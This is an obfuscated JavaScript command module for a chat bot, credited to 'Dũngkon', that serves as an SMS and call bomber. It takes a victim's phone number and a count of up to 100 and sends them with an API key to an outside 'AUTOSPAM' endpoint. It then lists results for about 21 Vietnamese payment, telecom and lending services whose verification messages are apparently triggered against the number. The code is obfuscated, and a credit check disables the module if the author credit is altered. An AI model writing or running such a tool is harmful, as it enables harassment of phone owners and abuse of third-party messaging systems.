const apikey = ['KEYVIPKAISER_1k']
module.exports.config = {
  name: 'spam',
  version: '1.0.2',
  hasPermssion: 0,
  credits: 'Dũngkon',
  description: 'Spam sms + call',
  commandCategory: 'Tiện ích',
  usages: 'spam sđt|số lần',
  cooldowns: 5,
}
function _0x8c77(_0x51ff70, _0x9c14e9) {
  const _0x355b93 = _0x4b1e()
  _0x8c77 = function (_0x464c27, _0x2cc5eb) {
    _0x464c27 = _0x464c27 - 255
    let _0x3949ec = _0x355b93[_0x464c27]
    return _0x3949ec
  }
  return _0x8c77(_0x51ff70, _0x9c14e9)
}
;(function (_0x4936a2, _0x2b4839) {
  const _0x35a7ac = _0x8c77,
    _0x2099a6 = _0x4936a2()
  while (true) {
    try {
      const _0x24e590 =
        parseInt(_0x35a7ac(312)) / 1 +
        -parseInt(_0x35a7ac(263)) / 2 +
        (-parseInt(_0x35a7ac(259)) / 3) * (parseInt(_0x35a7ac(302)) / 4) +
        -parseInt(_0x35a7ac(257)) / 5 +
        -parseInt(_0x35a7ac(290)) / 6 +
        (-parseInt(_0x35a7ac(317)) / 7) * (-parseInt(_0x35a7ac(276)) / 8) +
        (-parseInt(_0x35a7ac(313)) / 9) * (-parseInt(_0x35a7ac(288)) / 10)
      if (_0x24e590 === _0x2b4839) {
        break
      } else {
        _0x2099a6.push(_0x2099a6.shift())
      }
    } catch (_0x553484) {
      _0x2099a6.push(_0x2099a6.shift())
    }
  }
})(_0x4b1e, 337811)
module.exports.run = async function ({
  api: _0x30bede,
  event: _0x1cf0cc,
  args: _0x1e3e12,
}) {
  const _0x23135f = _0x8c77
  if (this[_0x23135f(305)].credits !== _0x23135f(315)) {
    return _0x30bede[_0x23135f(311)](
      _0x23135f(316),
      _0x1cf0cc[_0x23135f(306)],
      _0x1cf0cc[_0x23135f(262)]
    )
  }
  const _0x15fc0b = require(_0x23135f(289))
  var _0x4ca3dd = []
  const _0x5ae0fa = _0x1e3e12
      .join(' ')
      .trim()
      [_0x23135f(272)](/\s+/g, ' ')
      [_0x23135f(272)](/(\s+\|)/g, ' | ')
      [_0x23135f(272)](/\|\s+/g, _0x23135f(299))
      [_0x23135f(300)](_0x23135f(299))[0],
    _0x1dec2e = _0x1e3e12
      .join(' ')
      [_0x23135f(293)]()
      [_0x23135f(272)](/\s+/g, ' ')
      [_0x23135f(272)](/(\s+\|)/g, _0x23135f(299))
      [_0x23135f(272)](/\|\s+/g, ' | ')
      [_0x23135f(300)](_0x23135f(299))[1]
  if (!_0x5ae0fa) {
    return _0x30bede.sendMessage(
      _0x23135f(282),
      _0x1cf0cc[_0x23135f(306)],
      _0x1cf0cc[_0x23135f(262)]
    )
  }
  if (!_0x1dec2e) {
    return _0x30bede.sendMessage(
      _0x23135f(280),
      _0x1cf0cc[_0x23135f(306)],
      _0x1cf0cc[_0x23135f(262)]
    )
  }
  if (_0x1dec2e > 100 || _0x1dec2e == 101) {
    return _0x30bede[_0x23135f(311)](_0x23135f(295), _0x1cf0cc[_0x23135f(306)])
  }
  var _0x16eabf = await global[_0x23135f(275)].getContent(
    _0x23135f(265) +
      _0x5ae0fa +
      _0x23135f(314) +
      _0x1dec2e +
      _0x23135f(286) +
      apikey
  )
  let _0x530a01 = _0x16eabf[_0x23135f(287)]['DATA OPT'][_0x23135f(270)],
    _0x56f9c8 = _0x16eabf[_0x23135f(287)][_0x23135f(266)][_0x23135f(279)],
    _0x5def46 = _0x16eabf[_0x23135f(287)][_0x23135f(266)][_0x23135f(301)],
    _0x5849c3 = _0x16eabf[_0x23135f(287)][_0x23135f(266)][_0x23135f(273)],
    _0x1b6f7a = _0x16eabf.data[_0x23135f(266)][_0x23135f(307)],
    _0x37849f = _0x16eabf[_0x23135f(287)][_0x23135f(266)][_0x23135f(281)],
    _0x527c4a = _0x16eabf.data['DATA OPT'][_0x23135f(268)],
    _0xace32f = _0x16eabf.data[_0x23135f(266)][_0x23135f(260)],
    _0x5acc4b = _0x16eabf.data[_0x23135f(266)][_0x23135f(264)],
    _0x465731 = _0x16eabf[_0x23135f(287)][_0x23135f(266)][_0x23135f(277)],
    _0x38ea03 = _0x16eabf[_0x23135f(287)][_0x23135f(266)][_0x23135f(297)],
    _0x517a5f = _0x16eabf[_0x23135f(287)][_0x23135f(266)][_0x23135f(294)],
    _0x532390 = _0x16eabf.data[_0x23135f(266)][_0x23135f(278)],
    _0x4194a9 = _0x16eabf[_0x23135f(287)][_0x23135f(266)][_0x23135f(285)],
    _0x436cfc = _0x16eabf[_0x23135f(287)][_0x23135f(266)][_0x23135f(261)],
    _0x53e9cd = _0x16eabf.data['DATA OPT'].TT,
    _0x5191c4 = _0x16eabf[_0x23135f(287)]['DATA OPT'][_0x23135f(271)],
    _0x72a884 = _0x16eabf[_0x23135f(287)][_0x23135f(266)].DONGPLUS,
    _0x70a2ba = _0x16eabf.data[_0x23135f(266)][_0x23135f(292)],
    _0x322b33 = _0x16eabf[_0x23135f(287)]['DATA OPT'][_0x23135f(284)],
    _0x45bd90 = _0x16eabf[_0x23135f(287)][_0x23135f(266)].VIEON
  return _0x30bede[_0x23135f(311)](
    '[ SPAM SMS BY DŨNGKON ]\n----------\n1.MOMO: ' +
      _0x530a01 +
      '\n----------\n2.META: ' +
      _0x56f9c8 +
      _0x23135f(291) +
      _0x5def46 +
      '\n----------\n4.TV360: ' +
      _0x5849c3 +
      _0x23135f(274) +
      _0x1b6f7a +
      _0x23135f(310) +
      _0x37849f +
      '\n----------\n7.LOSHIP: ' +
      _0x527c4a +
      _0x23135f(256) +
      _0xace32f +
      _0x23135f(309) +
      _0x5acc4b +
      _0x23135f(296) +
      _0x465731 +
      _0x23135f(267) +
      _0x38ea03 +
      _0x23135f(303) +
      _0x517a5f +
      '\n----------\n13.VIETTELLPAY: ' +
      _0x532390 +
      _0x23135f(269) +
      _0x4194a9 +
      '\n----------\n15.VAYVND: ' +
      _0x436cfc +
      _0x23135f(283) +
      _0x53e9cd +
      _0x23135f(255) +
      _0x5191c4 +
      _0x23135f(298) +
      _0x72a884 +
      _0x23135f(258) +
      _0x70a2ba +
      _0x23135f(304) +
      _0x322b33 +
      _0x23135f(308) +
      _0x45bd90,
    _0x1cf0cc[_0x23135f(306)],
    _0x1cf0cc[_0x23135f(262)]
  )
}
function _0x4b1e() {
  const _0x791b9 = [
    '\n----------\n16.TT: ',
    'POPS',
    'TAMO',
    '&apikey=',
    'data',
    '1890oHxQyg',
    'axios',
    '1747086zffwCl',
    '\n----------\n3.FPTSHOP: ',
    'VAYNO',
    'trim',
    'VT2',
    'Số lần không được quá 100 lần',
    '\n----------\n10.TIENOI: ',
    'VIETTELL',
    '\n----------\n18.DONGPLUS: ',
    ' | ',
    'split',
    'FPTSHOP',
    '116myUAAA',
    '\n----------\n12.VT2: ',
    '\n----------\n20.POPS: ',
    'config',
    'threadID',
    'ATM',
    '\n----------\n21.VIEON: ',
    '\n----------\n9.MONEYVEO: ',
    '\n----------\n6.F88: ',
    'sendMessage',
    '246188EtzWBy',
    '33849ovHNMq',
    '&count=',
    'Dũngkon',
    'Đã bảo đừng thay credit rồi mà không nghe, thay lại credit ngay không là đéo dùng được đâu nha',
    '511bLbyIH',
    '\n----------\n17.LOZI',
    '\n----------\n8.ZALOPAY: ',
    '28065ejKKhJ',
    '\n----------\n19.VAYNO: ',
    '61773yxHxwA',
    'ZALOPAY',
    'VAYVND',
    'messageID',
    '591828HJJUGb',
    'MONEYVEO',
    'https://api.huykaiser.me/API/AUTOSPAM/spam?phone=',
    'DATA OPT',
    '\n----------\n11.VIETTELL: ',
    'LOSHIP',
    '\n----------\n14.TAMO: ',
    'MOMO',
    'LOZI',
    'replace',
    'TV360',
    '\n----------\n5.ATM: ',
    'utils',
    '62536BZohNa',
    'TIENOI',
    'VIETTELLPAY',
    'META_VN',
    'Thiếu số lần\nvui lòn nhập theo định dạng\n spam số điện thoại|số lần',
    'F88',
    'Thiếu số điện thoại\nvui lòn nhập theo định dạng\n spam số điện thoại|số lần',
  ]
  _0x4b1e = function () {
    return _0x791b9
  }
  return _0x4b1e()
}
